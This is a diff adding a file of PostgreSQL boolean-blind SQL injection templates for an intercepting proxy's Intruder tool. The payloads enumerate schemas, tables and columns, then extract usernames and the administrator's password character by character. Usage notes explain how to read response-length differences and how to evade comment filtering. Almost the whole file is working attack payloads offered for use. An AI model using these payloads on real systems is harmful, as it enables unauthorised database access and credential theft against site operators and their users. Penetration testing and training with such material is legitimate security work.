@@ -1,0 +1,50 @@
+# PostgreSQL Boolean-Blind Intruder Templates
+# Usage:
+# - Insert into vulnerable parameter, mark placeholders §…§.
+# - Placeholders: §N§ (length), §POS§ (char index), §CUT§ (ASCII threshold), §OFFSET§ (row offset), §SCHEMA§ (schema name), §TABLE§ (table name)
+# - Prefer CASE WHEN … THEN 1 ELSE 0 END in non-string contexts.
+# - Signal via Content-Length/response diffs. Add Grep - Extract/Match.
+
+# --- Database/schema enumeration ---
+# Sanity: schemas exist
+' AND (SELECT COUNT(*) FROM information_schema.schemata)>0-- 
+# Schema name length (by row)
+' AND LENGTH((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET §OFFSET§))>§N§-- 
+# Schema name char > CUT
+' AND ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET §OFFSET§),§POS§,1))>§CUT§-- 
+# Schema name char == literal
+' AND SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET §OFFSET§),§POS§,1)='a'-- 
+
+# --- Table enumeration ---
+# Any tables in schema
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='§SCHEMA§')>0-- 
+# Table name length
+' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='§SCHEMA§' ORDER BY table_name LIMIT 1 OFFSET §OFFSET§))>§N§-- 
+# Table name char > CUT
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='§SCHEMA§' ORDER BY table_name LIMIT 1 OFFSET §OFFSET§),§POS§,1))>§CUT§-- 
+# Table name char == literal
+' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='§SCHEMA§' ORDER BY table_name LIMIT 1 OFFSET §OFFSET§),§POS§,1)='a'-- 
+
+# --- Column enumeration ---
+# Column count for table
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='§SCHEMA§' AND table_name='§TABLE§')>0-- 
+# Column name length
+' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='§SCHEMA§' AND table_name='§TABLE§' ORDER BY ordinal_position LIMIT 1 OFFSET §OFFSET§))>§N§-- 
+# Column name char > CUT
+' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='§SCHEMA§' AND table_name='§TABLE§' ORDER BY ordinal_position LIMIT 1 OFFSET §OFFSET§),§POS§,1))>§CUT§-- 
+# Column name char == literal
+' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='§SCHEMA§' AND table_name='§TABLE§' ORDER BY ordinal_position LIMIT 1 OFFSET §OFFSET§),§POS§,1)='a'-- 
+
+# --- Username/password extraction (examples) ---
+# Enumerate usernames
+' AND LENGTH((SELECT username FROM §SCHEMA§.users ORDER BY username LIMIT 1 OFFSET §OFFSET§))>§N§-- 
+' AND ASCII(SUBSTRING((SELECT username FROM §SCHEMA§.users ORDER BY username LIMIT 1 OFFSET §OFFSET§),§POS§,1))>§CUT§-- 
+# Extract password for a known user
+' AND LENGTH((SELECT password FROM §SCHEMA§.users WHERE username='administrator'))>§N§-- 
+' AND ASCII(SUBSTRING((SELECT password FROM §SCHEMA§.users WHERE username='administrator'),§POS§,1))>§CUT§-- 
+' AND SUBSTRING((SELECT password FROM §SCHEMA§.users WHERE username='administrator'),§POS§,1)='a'-- 
+
+# Notes:
+# - In numeric parameter contexts, remove the leading quote.
+# - If -- comments are filtered, try /* */ or change spacing.
+
